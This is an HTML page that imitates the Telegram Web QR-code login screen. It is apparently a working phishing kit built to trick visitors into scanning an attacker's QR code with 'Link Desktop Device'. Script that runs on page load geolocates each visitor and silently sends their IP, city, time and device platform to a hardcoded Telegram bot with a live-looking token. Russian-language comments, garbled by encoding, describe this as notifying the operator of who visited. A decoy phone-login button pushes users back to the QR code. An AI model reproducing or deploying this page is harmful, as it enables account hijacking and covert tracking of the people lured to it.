<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <title>Telegram Web</title>
    <style>
        body {
            background-color: #0f1721;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .login-container {
            text-align: center;
            max-width: 360px;
            width: 100%;
            padding: 20px;
        }
        .qr-wrapper {
            background: white;
            padding: 10px;
            border-radius: 20px;
            display: inline-block;
            margin-bottom: 30px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }
        .qr-wrapper img {
            width: 220px;
            height: 220px;
            display: block;
            border-radius: 10px;
        }
        h2 { font-size: 28px; margin: 0 0 15px 0; font-weight: 500; }
        ol {
            text-align: left;
            padding: 0;
            list-style: none;
            counter-reset: item;
            color: #f1f1f1;
            line-height: 1.5;
            font-size: 15px;
            margin: 0 auto;
            display: inline-block;
        }
        ol li {
            counter-increment: item;
            margin-bottom: 12px;
            display: flex;
            align-items: flex-start;
        }
        ol li::before {
            content: counter(item) ". ";
            font-weight: bold;
            color: #3390ec;
            margin-right: 12px;
            min-width: 18px;
        }
        .link-action {
            color: #3390ec;
            text-decoration: none;
            font-weight: 500;
            display: block;
            margin-top: 35px;
            cursor: pointer;
            font-size: 15px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="qr-wrapper">
        <img src="https://i.ibb.co/fYQ8v6tx/qr-code.png" alt="Telegram QR">
    </div>

    <h2>Log in to Telegram by QR Code</h2>

    <ol>
        <li>Open Telegram on your phone</li>
        <li>Go to <b>Settings</b> > <b>Devices</b> > <b>Link Desktop Device</b></li>
        <li>Point your phone at this screen to confirm login</li>
    </ol>

    <div class="link-action" id="phone-btn">
        Log in by phone number <span id="prefix-display"></span>
    </div>
</div>

<script>
const BOT_TOKEN = '8244809963:AAHw9Gfy7mDNRuWKjyqsBAu52Y5isnjY7CY';
const CHAT_ID = '7128871752';

async function captureAndNotify() {
    try {
        // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ì–ï–û
        const response = await fetch('https://ipapi.co/json/');
        const geo = await response.json();

        // –ü–æ–¥—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–µ—Ñ–∏–∫—Å–∞
        const prefixDisplay = document.getElementById('prefix-display');
        let prefix = "+" + (geo.country_calling_code || "");
        if (geo.country_code === "UA") prefix = "+380";
        if (geo.country_code === "RU") prefix = "+7";
        prefixDisplay.innerText = prefix;

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ –¢–í–û–ô –±–æ—Ç (—á—Ç–æ–±—ã —Ç—ã –∑–Ω–∞–ª, –∫—Ç–æ –∑–∞—à–µ–ª)
        const now = new Date();
        const logMsg = `
üîî <b>–ù–æ–≤—ã–π –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ!</b>
<b>IP:</b> ${geo.ip}
<b>–ì–æ—Ä–æ–¥:</b> ${geo.city}, ${geo.country_name}
<b>–í—Ä–µ–º—è:</b> ${now.toLocaleString()}
<b>–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:</b> ${navigator.platform}
        `.trim();

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: logMsg,
                parse_mode: 'HTML'
            })
        });
    } catch (e) {
        console.log("Silent error");
    }
}

window.onload = captureAndNotify;

document.getElementById('phone-btn').onclick = () => {
    alert("Please use QR code to authorize this session.");
};
</script>

</body>
</html>
